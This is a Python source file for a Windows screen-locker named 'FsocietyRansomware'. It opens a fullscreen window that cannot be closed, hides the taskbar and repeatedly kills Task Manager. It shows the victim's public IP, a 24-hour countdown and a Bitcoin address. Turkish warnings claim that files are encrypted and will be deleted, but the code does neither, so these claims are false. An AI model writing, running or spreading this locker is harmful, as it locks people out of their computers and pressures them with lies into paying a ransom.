import tkinter as tk
from tkinter import messagebox
import threading
import time
import requests
import socket
import psutil
import sys
import os
from PIL import Image, ImageTk
import win32gui
import win32con

class FsocietyRansomware:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("fsociety")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.resizable(False, False)
        
        # Disable Alt+F4
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.bind('<Alt-F4>', lambda e: "break")
        self.root.bind('<Control-Escape>', lambda e: "break")
        
        # Get IP Address
        self.ip_address = self.get_ip()
        
        # Timer
        self.time_left = 24 * 60 * 60  # 24 hours in seconds
        self.running = True
        
        # Block Task Manager
        self.block_task_manager()
        
        # Create GUI
        self.create_gui()
        
        # Start timer thread
        self.timer_thread = threading.Thread(target=self.update_timer, daemon=True)
        self.timer_thread.start()
        
        # Start task manager blocking thread
        self.tm_thread = threading.Thread(target=self.block_task_manager_continuously, daemon=True)
        self.tm_thread.start()
        
    def get_ip(self):
        try:
            # Get public IP
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            # Fallback to local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return "Unknown"

    def create_gui(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True)
        
        # Title
        title_label = tk.Label(main_frame, text="fsociety", font=('Courier', 72, 'bold'), 
                              fg='#00FF00', bg='black')
        title_label.pack(pady=50)
        
        # IP Display
        ip_frame = tk.Frame(main_frame, bg='black')
        ip_frame.pack(pady=20)
        tk.Label(ip_frame, text="CORRECT IP:", font=('Courier', 24, 'bold'), 
                fg='#FF0000', bg='black').pack()
        tk.Label(ip_frame, text=self.ip_address, font=('Courier', 28, 'bold'), 
                fg='#FFFFFF', bg='black').pack()
        
        # Jester text replaced
        jester_frame = tk.Frame(main_frame, bg='black')
        jester_frame.pack(pady=30)
        tk.Label(jester_frame, text="X E I N N", font=('Courier', 48, 'bold'), 
                fg='#00FFFF', bg='black').pack()
        
        # Additional text
        tk.Label(main_frame, text="Dünyayı daha güzel yapacağım.", 
                font=('Courier', 24), fg='#FFFF00', bg='black').pack(pady=10)
        tk.Label(main_frame, text="DoomsdayClient kullanmayın.", 
                font=('Courier', 20), fg='#FF00FF', bg='black').pack(pady=5)
        
        # Timer
        self.timer_label = tk.Label(main_frame, text="", font=('Courier', 48, 'bold'), 
                                   fg='#FF0000', bg='black')
        self.timer_label.pack(pady=50)
        
        # Warning message
        warning = tk.Label(main_frame, 
                          text="SISTEMINIZ KILITLANDI\nDosyalarınız şifrelendi\n24 saat içinde ödeme yapmazsanız\nTÜM VERİLERİNİZ SİLİNECEK",
                          font=('Courier', 28, 'bold'), justify='center',
                          fg='#FFFFFF', bg='black')
        warning.pack(pady=50)
        
        # Bitcoin payment info (fake)
        payment_frame = tk.Frame(main_frame, bg='black')
        payment_frame.pack(pady=30)
        tk.Label(payment_frame, text="BTC ADRESİ:", font=('Courier', 20, 'bold'), 
                fg='#FFA500', bg='black').pack()
        tk.Label(payment_frame, text="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", 
                font=('Courier', 18), fg='#FFFFFF', bg='black').pack()
        
    def format_time(self, seconds):
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        secs = seconds % 60
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"
    
    def update_timer(self):
        while self.running and self.time_left > 0:
            self.timer_label.config(text=f"ZAMAN KALAN: {self.format_time(self.time_left)}")
            self.root.update()
            time.sleep(1)
            self.time_left -= 1
        
        if self.time_left <= 0:
            self.show_end_screen()
    
    def show_end_screen(self):
        self.root.destroy()
        end_window = tk.Tk()
        end_window.attributes('-fullscreen', True)
        end_window.configure(bg='black')
        tk.Label(end_window, text="SÜRE DOLDU!\nTÜM VERİLER KALICI OLARAK SİLİNDİ", 
                font=('Courier', 60, 'bold'), fg='red', bg='black').pack(expand=True)
        end_window.mainloop()
    
    def block_task_manager(self):
        # Hide taskbar
        try:
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        except:
            pass
    
    def block_task_manager_continuously(self):
        while self.running:
            try:
                # Kill task manager processes
                for proc in psutil.process_iter(['pid', 'name']):
                    if 'taskmgr' in proc.info['name'].lower() or 'taskman' in proc.info['name'].lower():
                        proc.kill()
                
                # Block task manager window
                def enum_windows_callback(hwnd, windows):
                    if win32gui.IsWindowVisible(hwnd):
                        window_text = win32gui.GetWindowText(hwnd)
                        if 'Görev' in window_text or 'Task' in window_text:
                            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                    return True
                win32gui.EnumWindows(enum_windows_callback, None)
                
            except:
                pass
            time.sleep(0.1)
    
    def on_closing(self):
        pass  # Prevent closing
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = FsocietyRansomware()
    app.run()